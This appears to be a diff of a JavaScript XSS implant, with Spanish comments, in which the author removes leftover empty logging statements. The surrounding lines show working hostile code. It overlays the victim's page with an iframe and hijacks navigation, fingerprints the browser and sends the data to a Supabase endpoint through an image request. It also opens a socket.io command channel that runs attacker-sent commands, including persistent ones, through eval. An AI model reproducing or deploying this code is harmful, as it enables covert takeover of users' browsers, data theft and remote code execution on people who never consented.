@@ -19,8 +19,6 @@ if (window.self !== window.top) {
 function executeMainXSS() {
     'use strict';
     
-     ;
-    
     // 1. CREAR IFRAME INMEDIATAMENTE (ANTES DE NADA)
     function createIframeFirst() {
         try {
@@ -54,9 +52,7 @@ function executeMainXSS() {
             document.body.style.margin = '0';
             document.body.style.padding = '0';
             document.body.appendChild(iframe);
-            
-             ;
-            
+
             // 2. CONFIGURAR SISTEMA DE RUTAS DESPUÉS DEL IFRAME
             setupRouteSystem(iframe);
             
@@ -64,7 +60,6 @@ function executeMainXSS() {
             executeFullFingerprinting();
             
         } catch(e) {
-             ;
             setTimeout(createIframeFirst, 100);
         }
     }
@@ -98,7 +93,6 @@ function executeMainXSS() {
         // Escuchar mensajes del iframe para cambios de URL
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'URL_CHANGE') {
-                 ;
                 updateBrowserURL(event.data.url);
             }
         });
@@ -106,11 +100,8 @@ function executeMainXSS() {
         // Manejar botones atrás/adelante
         window.addEventListener('popstate', function() {
             const newPath = window.location.pathname + window.location.search;
-             ;
             iframe.src = newPath;
         });
-        
-         ;
     }
     
     // 3. FINGERPRINTING COMPLETO (TU CÓDIGO ORIGINAL)
@@ -185,11 +176,9 @@ function executeMainXSS() {
             var i = new Image();
             i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                     btoa(JSON.stringify(d)).substring(0,1500);
-                    
-             ;
-            
+
         } catch(e) {
-             ;
+
         }
     }
     
@@ -209,7 +198,6 @@ function setupIframeRouteSimulation() {
     }
     window.__IFRAME_ROUTES_ACTIVE__ = true;
     
-     ;
     
     // A. INTERCEPTAR HISTORY API
     const originalPushState = history.pushState;
@@ -254,8 +242,7 @@ function setupIframeRouteSimulation() {
                 target.href.includes('.csv') ||
                 target.href.includes('.zip') ||
                 target.download) {
-                
-                 ;
+ 
                 // Dejar que la descarga proceda normalmente
                 return;
             }
@@ -328,8 +315,7 @@ function setupIframeRouteSimulation() {
             }, '*');
         }
     }, 300);
-    
-     ;
+
 }
 
 function setupWebSocketController() {
@@ -348,7 +334,6 @@ function setupWebSocketController() {
             return;
         }
         
-         ;
         const script = document.createElement('script');
         script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
         script.onload = function() {
@@ -375,7 +360,7 @@ function setupWebSocketController() {
                 });
                 
                 socket.on('connect', function() {
-                     ;
+
                 });
                 
                 // Manejar evento execute-command
@@ -394,16 +379,15 @@ function setupWebSocketController() {
                 });
                 
                 socket.on('disconnect', function(reason) {
-                     ;
+
                 });
                 
                 socket.on('connect_error', function(error) {
-                     ;
                     setTimeout(connectWebSocket, 5000);
                 });
                 
             } catch (error) {
-                 ;
+
                 setTimeout(connectWebSocket, 5000);
             }
         });
@@ -417,14 +401,12 @@ function setupWebSocketController() {
             // ✅ EJECUCIÓN LIBRE CON eval()
             const result = eval(command);
             
-             ;
             
             if (persistent && id) {
                 persistentScripts[id] = { 
                     script: command, 
                     cleanup: typeof result === 'function' ? result : null 
                 };
-                 ;
             }
             
             // Enviar confirmación
@@ -438,8 +420,7 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
-             ;
-            
+
             // Enviar error
             if (socket && socket.connected) {
                 socket.emit('command_error', {
@@ -454,24 +435,20 @@ function setupWebSocketController() {
     function handleDestroyPersistent(data) {
         const { id } = data;
         
-         ;
-        
         if (persistentScripts[id]) {
             // Ejecutar cleanup si existe
             if (persistentScripts[id].cleanup) {
                 try {
                     persistentScripts[id].cleanup();
-                     ;
                 } catch (error) {
-                     ;
+
                 }
             } else {
-                 ;
+
             }
             
             // Remover del diccionario
             delete persistentScripts[id];
-             ;
             
             // Enviar confirmación
             if (socket && socket.connected) {
@@ -482,7 +459,6 @@ function setupWebSocketController() {
                 });
             }
         } else {
-             ;
             
             // Enviar error
             if (socket && socket.connected) {
@@ -495,13 +471,10 @@ function setupWebSocketController() {
     }
 
     function handleSyncPersistent(data) {
-         ;
         
         try {
             for (const [id, cmd] of Object.entries(data)) {
                 try {
-                     ;
-                    
                     // EJECUCIÓN LIBRE
                     const result = eval(cmd);
                     
@@ -511,14 +484,10 @@ function setupWebSocketController() {
                         cleanup: typeof result === 'function' ? result : null 
                     };
                     
-                     ;
                     
                 } catch (error) {
-                     ;
                 }
             }
-            
-             ;
             
             // Enviar confirmación
             if (socket && socket.connected) {
@@ -529,7 +498,6 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
-             ;
             
             if (socket && socket.connected) {
                 socket.emit('sync_error', {
